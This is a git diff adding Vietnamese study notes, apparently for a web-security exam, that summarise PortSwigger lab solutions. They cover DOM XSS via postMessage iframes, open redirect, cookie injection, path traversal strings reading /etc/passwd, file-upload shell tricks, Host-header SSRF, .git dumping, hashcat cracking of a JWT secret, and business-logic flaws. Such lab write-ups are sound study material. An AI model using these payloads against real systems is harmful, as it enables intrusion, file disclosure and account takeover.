@@ -482,7 +482,204 @@ payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 puts Base64.encode64(payload)
 ```
 
-# DOM-based vulnerabilities
+# DOM-based vulnerabilities (5 bài)
+
+## DOM XSS using web messages
+
+Context: Dùng hàm `addEventListener()` để lắng nghe message.
+
+Nó sẽ lắng nghe để gắn quảng cáo vào trang web. 
+
+Tạo 1 iframe ở server exploit, iframe này dẫn đến trang web cần exploit và có gửi thêm message, 
+
+payload:
+
+`<iframe src="https://0a3e00fa03d89772812011d8009c002a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+
+## DOM XSS using web messages and a JavaScript URL
+
+Context: Dùng hàm `addEventListener()` + sink: `location.href` + URL cần có `http/https`
+
+Payload: `<iframe src="https://0a60005c0338391482ef47cf007b003b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
+
+## DOM XSS using web messages and JSON.parse
+
+Context: `addEventListener` + message dạng JSON
+
+Ở đây ta thấy có thêm điều kiện `type=load-channel` để có thể được gán `src` = `d.url`.
+
+Payload: `<iframe src=https://0a9b004b04098a3c80aa857e0066000e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
+
+## DOM-based open redirection
+
+Context: sink `location.href`, parameter `url` sẽ chứa đường dẫn để turn back
+
+Payload: `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
+
+Ta đặt `url` chuyển hướng về server exploit
+
+## DOM-based cookie manipulation
+
+Context: code tạo cookie phía client `lastViewedProduct` để lưu trang cuối cùng đã xem 
+
+Nhưng giá trị này sẽ lấy tất cả path phía sau và không có filter, vì thế ta sẽ chèn `'` để thoát ra và chèn thêm mã js vào. 
+
+Payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`
+
+Iframe này dẫn đến 1 bài post và có thêm mã js, sau đó cookie sẽ lưu lại, và cũng trong iframe này, sự kiện onload ngay lập tức đưa về trang chủ để cookie không bị sửa đổi cũng như người dùng không phát hiện. Và khi người dùng tải lại trang chủ mã sẽ thực thi tự động
+
+# Path Traversal 
+
+## File path traversal, traversal sequences blocked with absolute path bypass
+
+Dùng đường dẫn tuyệt đối
+
+Payload: `/etc/passwd`
+
+## File path traversal, traversal sequences stripped non-recursively
+
+Payload: `....//....//....//etc/passwd`
+
+## File path traversal, traversal sequences stripped with superfluous URL-decode
+
+URL encode
+
+Payload: `..%252f..%252f..%252fetc/passwd`
+
+## File path traversal, validation of start of path
+
+Start với 1 path bắt buộc 
+
+Payload: `/var/www/images/../../../etc/passwd`
+
+## File path traversal, validation of file extension with null byte bypass
+
+Phân extention tự thêm cố định, loại bỏ bằng null 
+
+Payload: `../../../etc/passwd%00.png`
+
+# File Upload
+
+- up shell
+
+- up `.htaccess` thêm extention
+
+- kết hợp null byte 
+
+- thoát khỏi folder tắt PHP engine, đến folder có thể thực thi
+
+- thêm mã PHP vào ảnh 
+
+# HTTP Host header attacks (4 bài)
+
+## Web cache poisoning via ambiguous requests
+
+Host default thì được lưu vào cache, nếu thay đổi sẽ không được lưu
+
+`Host` thay đổi ảnh hưởng response
+
+Nhưng có thể dùng 2 header `Host` để vẫn được lưu vào cache vẫn đổi được Host trong repsonse
+
+[xem đầy đủ](<../HTTP Host header attacks/How to identify and exploit HTTP Host header vulnerabilities.md>)
+
+## Routing-based SSRF
+
+Thay `Host` bằng Burp collab để xác định có tác dụng
+
+Chạy Intruder tìm ip: `192.168.0.x`
+
+Sau đó vào `/admin` với host vừa tìm được
+
+## SSRF via flawed request parsing
+
+Thay đổi `Host` sẽ bị báo ko hợp lệ 
+
+Có thể truy cập bằng cách:
+
+`GET https://YOUR-LAB-ID.web-security-academy.net/`
+
+Theo cách mới này thì đổi `Host` không còn bị báo không hợp lệ mà URL sẽ bị báo time out
+
+Gửi 1 request dạng:
+
+```http
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+
+Xác nhận thành công, thay `Host` bằng dải IP: `192.168.0.x`
+
+Sau đó truy cập admin
+
+`GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
+
+Lấy cookie và chuyển request sang POST để có thể xóa
+
+## Host validation bypass via connection state attack
+
+Kết nối bình thường vào `/admin` với `Host: 192.168.0.1` ta sẽ bị chuyển hướng
+
+Thiết lập 2 request, 1 request bình thường và 1 request vào `admin`
+
+Gom vào 1 group và dùng chế độ `Send group in sequence (single connection)` và đổi `Connection` thành `keep-alive` ở request bình thường
+
+Ta sẽ vào được `/admin` và tiếp tục thực hiện gửi 2 request với request xóa `carlos`
+
+# Information disclosure
+
+`robots.txt`, `/backup`, `.git`, `TRACE` method
+
+Dùng dirsearch
+
+Nếu `git`
+
+`wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/`
+
+Vào file `.git` 
+
+`git log`
+
+`git <hash>` để xem chi tiết thay đổi
+
+# JWT
+
+- Không có bảo vệ, thay thẳng `administrator` vào là có thể access
+
+- none alg: Thay bằng `administrator` và choose "attack" -> "none" Signing algorithm 
+
+- weak symmetric key: 
+  ```
+  ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
+  └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list 
+
+  ┌──(kali㉿kali)-[~/Desktop/exam-preparation]
+  └─$ hashcat -a 0 -m 16500 eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0 ./jwt/jwt.secrets.list --show
+  eyJraWQiOiJiNWM2MmM5ZS05YWZkLTQ0ODItODkwYy0zZTM2Y2YyNmUyOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MzMzMTcwNH0.uogTd4jaZZ5TxcovgRcegXA2gq208kLTgXxv_Gh3DZ0:secret1
+  ```
+- jwk inject key từ phía client:
+- jku header injection
+
+# Business logic vulnerabilities
+
+- Number có range phía trên, sau khi vượt quá nó quay về range dưới
+
+- String cắt ở 255 kí tự: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-id.exploit-server.net` và `len(aaa...@dontwannacry.com)=255` thì nó cắt lấy đoạn sau 
+
+- Đổi password: xóa `current password` vẫn có thể đổi thành công
+
+- Gửi `GET /cart/order-confirmation?order-confirmation=true` thì đồ trong giỏ hàng được check out thành công
+
+- Drop request `/role-selector` để ko nhận ra là role user
+
+- Dùng intruder để lặp lại mua voucher rồi dùng voucher (mỗi lần được +3$)
+
+- Authentication bypass via encryption oracle (lộ mã hóa)
+
+# 
+
+
+
+
 
 
 
